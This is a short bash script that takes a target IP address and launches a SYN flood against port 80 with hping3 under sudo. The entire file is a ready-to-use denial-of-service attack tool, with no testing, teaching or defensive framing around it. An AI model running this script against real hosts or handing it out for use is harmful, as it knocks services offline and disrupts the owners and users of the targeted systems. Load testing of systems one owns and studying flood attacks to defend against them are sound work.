#!/bin/bash
if [ -z "$1" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi
sudo hping3 --syn --flood -p 80 "$1"
